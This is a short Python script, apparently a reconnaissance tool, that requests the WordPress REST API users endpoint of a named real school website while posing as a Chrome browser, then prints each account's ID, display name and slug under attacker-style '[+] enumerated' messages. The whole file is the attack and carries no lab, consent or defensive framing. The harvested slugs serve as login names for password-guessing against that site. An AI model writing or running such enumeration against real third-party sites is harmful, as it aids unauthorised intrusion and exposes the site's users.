import requests
import json

url = "https://gn.cambridgeschool.edu.in/wp-json/wp/v2/users"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
}

try:
    response = requests.get(url, headers=headers, timeout=10)
    if response.status_code == 200:
        users = response.json()
        print(f"[+] Successfully enumerated {len(users)} users:")
        for user in users:
            print(f"ID: {user.get('id')} | Name: {user.get('name')} | Slug: {user.get('slug')}")
    else:
        print(f"[-] Failed to enumerate users. Status Code: {response.status_code}")
        print(f"Response: {response.text[:500]}")
except Exception as e:
    print(f"[!] Error: {e}")
